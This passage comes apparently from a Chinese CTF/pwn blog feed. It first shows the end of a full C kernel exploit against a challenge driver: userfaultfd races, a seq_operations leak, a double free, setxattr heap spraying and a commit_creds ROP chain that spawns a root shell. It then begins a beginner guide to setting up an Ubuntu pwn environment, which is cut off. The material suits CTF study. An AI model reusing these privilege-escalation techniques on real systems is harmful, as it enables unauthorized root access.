class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">void</span> *a)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(dev_fd, <span class="number">0x57AC0001</span>, a) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] add error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">void</span> *a)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(dev_fd, <span class="number">0x57AC0002</span>, a) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] del error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *page;</span><br><span class="line"><span class="type">size_t</span> page_size;</span><br><span class="line"><span class="type">size_t</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">long</span> uffd = (<span class="type">long</span>) arg;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = (<span class="type">int</span>) uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="type">int</span> nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: poll&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">        <span class="type">ssize_t</span> nread = read((<span class="type">int</span>) uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: EOF on userfaultfd!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: read&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Unexpected event on userfaultfd&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] add trapped in userfaultfd.&quot;</span>);</span><br><span class="line">        del(&amp;kernel_offset);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] leak addr: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">        kernel_offset -= <span class="number">0xffffffff8113be80</span>;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] uffdio_copy.dst: %p\n&quot;</span>, uffdio_copy.dst);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl((<span class="type">int</span>) uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">double_free_thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">long</span> uffd = (<span class="type">long</span>) arg;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = (<span class="type">int</span>) uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="type">int</span> nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: poll&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">        <span class="type">ssize_t</span> nread = read((<span class="type">int</span>) uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: EOF on userfaultfd!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: read&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Unexpected event on userfaultfd&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] del trapped in userfaultfd.&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] construct the double free...&quot;</span>);</span><br><span class="line">        del(page);</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] uffdio_copy.dst: %p\n&quot;</span>, uffdio_copy.dst);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl((<span class="type">int</span>) uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> seq_fd_reserve[<span class="number">100</span>], seq_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">hijack_thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">long</span> uffd = (<span class="type">long</span>) arg;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = (<span class="type">int</span>) uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="type">int</span> nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: poll&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">        <span class="type">ssize_t</span> nread = read((<span class="type">int</span>) uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: EOF on userfaultfd!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: read&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Unexpected event on userfaultfd&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] setxattr trapped in userfaultfd.&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            close(seq_fd_reserve[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        pop_rdi_ret += kernel_offset;</span><br><span class="line">        mov_rdi_rax_pop_rbp_ret += kernel_offset;</span><br><span class="line">        prepare_kernel_cred += kernel_offset;</span><br><span class="line">        commit_creds += kernel_offset;</span><br><span class="line">        swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">        __asm__(</span><br><span class="line">                <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">                <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">                <span class="string">&quot;mov r13,   pop_rdi_ret;&quot;</span></span><br><span class="line">                <span class="string">&quot;mov r12,   0;&quot;</span></span><br><span class="line">                <span class="string">&quot;mov rbp,   prepare_kernel_cred;&quot;</span></span><br><span class="line">                <span class="string">&quot;mov rbx,   mov_rdi_rax_pop_rbp_ret;&quot;</span></span><br><span class="line">                <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">                <span class="string">&quot;mov r10,   commit_creds;&quot;</span></span><br><span class="line">                <span class="string">&quot;mov r9,    swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">                <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">                <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">                <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">                <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">                <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">                <span class="string">&quot;mov rdi,   seq_fd;&quot;</span></span><br><span class="line">                <span class="string">&quot;syscall&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] back to userland successfully!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] uid: %d gid: %d\n&quot;</span>, getuid(), getgid());</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] execve root shell now...&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">void</span> *(*handler)(<span class="type">void</span> *))</span> &#123;</span><br><span class="line">    <span class="type">long</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: userfaultfd&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span> =</span> &#123;.api = UFFD_API, .features = <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span> (ioctl((<span class="type">int</span>) uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl((<span class="type">int</span>) uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">static</span> <span class="type">pthread_t</span> monitor_thread;</span><br><span class="line">    <span class="keyword">if</span> (pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="type">void</span> *) uffd) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: pthread_create&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((dev_fd = open(<span class="string">&quot;/proc/stack&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] open kstack error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    page_size = getpagesize();</span><br><span class="line">    page = (<span class="type">char</span> *) mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((seq_fd_reserve[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] open seq_operation error.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *leak_uffd_buf = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfaultfd(leak_uffd_buf, page_size, (<span class="type">void</span> *) leak_thread);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] open seq_operation error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(seq_fd);</span><br><span class="line">    add(leak_uffd_buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *uaf_uffd_buf = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfaultfd(uaf_uffd_buf, page_size, (<span class="type">void</span> *) double_free_thread);</span><br><span class="line"></span><br><span class="line">    add(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">    del(uaf_uffd_buf);</span><br><span class="line">    <span class="type">char</span> *hijack_uffd_buf = (<span class="type">char</span> *) mmap(<span class="literal">NULL</span>, page_size * <span class="number">2</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfaultfd(hijack_uffd_buf + page_size, page_size, (<span class="type">void</span> *) hijack_thread);</span><br><span class="line">    *(<span class="type">size_t</span> *) (hijack_uffd_buf + page_size - <span class="number">8</span>) = <span class="number">0xffffffff814d51c0</span> + kernel_offset;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] open seq_operation error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, page, hijack_uffd_buf + page_size - <span class="number">8</span>, <span class="number">32</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
]]></content>
  </entry>
  <entry>
    <title>linux user pwn 基础知识</title>
    <url>/2024/11/07/linux-user-pwn-basic-knowlege/</url>
    <content><![CDATA[<h1 id="环境搭建">环境搭建</h1>
<h2 id="虚拟机安装">虚拟机安装</h2>
<ul>
<li><p><a class="link" 
 href="http://old-releases.ubuntu.com/releases/" >镜像下载网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></li>
<li><p>为了避免环境问题建议 22.04 ，20.04，18.04，16.04 等常见版本
ubuntu 虚拟机环境各准备一份。注意定期更新快照以防意外。</p></li>
<li><p>虚拟机建议硬盘 256 G
以上，内存也尽量大一些。硬盘大小只是上界，256 G 不是真就占了 256
G，而后期如果硬盘空间不足会很麻烦。</p></li>
<li><p>更换 <a class="link" 
 href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/" >ubuntu
镜像源 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，建议先在
<code>系统设置 → Software &amp; Updates → Download from → 选择国内服务器例如阿里云</code>（貌似不这样后续换源会出错），然后再
<code>sudo gedit /etc/apt/sources.list</code>
将镜像源中<strong>不高于</strong>当前系统版本的镜像复制进去（高于当前系统版本容易把
<code>apt</code> 搞坏）。</p></li>
<li><p>Ubuntu 换源 error：The following signatures couldn’t be verified
because the public key is not available
解决方法：<code>sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 5523BAEEB01FA116</code>
其中的<code>5523BAEEB01FA116</code> 是根据错误提示写的。 ## 基础工具 ###
net-tools <code>ifconfig</code> 查看网络配置需要安装
<code>net-tools</code> 。 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install net-tools</span><br></pre></td></tr></table></figure></div> ### vim <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install vim</span><br></pre></td></tr></table></figure></div> ### gedit
不习惯 vim 的可以使用 gedit 文本编辑器。 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install gedit</span><br></pre></td></tr></table></figure></div> ### git
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install git</span><br></pre></td></tr></table></figure></div> ### gcc <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install gcc</span><br><span class="line"><span class="built_in">sudo</span> apt install gcc-multilib</span><br></pre></td></tr></table></figure></div> ### python ipython 提供了很好的
python 交互命令行，建议安装。 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install python2</span><br><span class="line"><span class="built_in">sudo</span> apt install python3</span><br><span class="line"><span class="built_in">sudo</span> apt install ipython</span><br><span class="line"><span class="built_in">sudo</span> apt install ipython3</span><br></pre></td></tr></table></figure></div> 另外有的版本 ubuntu
的不好安装 pip2 可以使用 <code>get-pip.py</code> 脚本安装。
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install python3-pip</span><br><span class="line"><span class="built_in">sudo</span> apt  install curl</span><br><span class="line">curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py</span><br><span class="line"><span class="built_in">sudo</span> python2 get-pip.py</span><br></pre></td></tr></table></figure></div> ubuntu 22.04 的 ipython（python2）必须使用 pip2 安装：
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pip2 install ipython</span><br></pre></td></tr></table></figure></div> ### docker <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install docker.io</span><br><span class="line"><span class="built_in">sudo</span> apt install docker-compose</span><br></pre></td></tr></table></figure></div> 默认情况下，Docker 命令需要使用
sudo 权限才能运行，这是因为 Docker 守护进程以 root
用户身份运行。然而，你可以通过以下步骤将当前用户添加到 Docker
用户组，从而允许在不使用 sudo 的情况下运行 Docker 命令：</p></li>
<li><p>确保当前用户属于 <code>docker</code>
组：运行以下命令检查当前用户是否已添加到 docker 组： <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">groups</span></span><br></pre></td></tr></table></figure></div>
在输出的组列表中查找 <code>docker</code>。如果没有找到
<code>docker</code> 组，请继续下一步。</p></li>
<li><p>将当前用户添加到 <code>docker</code>
组：运行以下命令将当前用户添加到 <code>docker</code> 组中（将
<code>&lt;username&gt;</code> 替换为你的用户名）：
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> usermod -aG docker &lt;username&gt;</span><br></pre></td></tr></table></figure></div></p></li>
<li><p>更新用户组更改：运行以下命令使用户组更改生效：
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">newgrp docker</span><br></pre></td></tr></table></figure></div></p></li>
<li><p>重新登录或重启系统：要使用户组更改永久生效，你需要注销当前会话并重新登录，或者重启系统。
### oh-my-zsh 安装 zsh</p></li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install zsh</span><br></pre></td></tr></table></figure></div>
<p>安装 <a class="link"   href="https://ohmyz.sh/#install" >oh-my-zsh <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure></div>
设置 zsh 为默认 shell（重启虚拟机后生效） <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure></div> 安装 oh-my-zsh
插件 <a class="link" 
 href="https://github.com/zsh-users/zsh-autosuggestions/blob/master/INSTALL.md" >zsh-autosuggestions <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link" 
 href="https://github.com/zsh-users/zsh-syntax-highlighting" >zsh-syntax-highlighting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-autosuggestions</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure></div> 编辑 <code>~/.zshrc</code> 添加插件： <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">plugins=( </span><br><span class="line">    <span class="comment"># other plugins...</span></span><br><span class="line">    zsh-autosuggestions</span><br><span class="line">    zsh-syntax-highlighting</span><br><span class="line">    extract</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>
更新： <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">omz update</span><br></pre></td></tr></table></figure></div> ## pwn 相关工具 ### clion <a class="link" 
 href="https://www.jetbrains.com/clion/download/#section=linux" >clion <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
是一款 C++ 的 IDE ，可以用来阅读 glibc
源码的工具，这款工具对<strong>宏展开</strong>，<strong>符号跳转</strong>，<strong>结构体大小以及成员偏移计算</strong>都有很好的支持。这款软件需要付费使用，不过可以某宝搞一个教育邮箱。</p>
<p>首先用打开 <a class="link" 
 href="https://gitcode.net/qq_45323960/debug_glibc" >debug_glibc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
解压后的 glibc 源码，这里有以下几点需要注意： - 源码在对应版本的
<code>source</code> 目录下。 - 最好不要使用解压到默认
<code>\glibc</code>
路径下的源码，因为源码调试与行号绑定，阅读源码可能会修改到源码。 -
这里用 <code>debug_glibc</code>
中的源码是因为这里的源码是编译过的，clion
分析代码需要编译的配置文件。</p>
<p>然后这里我们看到 Makefile 没有正确导入：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241107232611195.png"
                     
alt="image-20241107232611195" 
                > 在较新版本的 clion 中位于
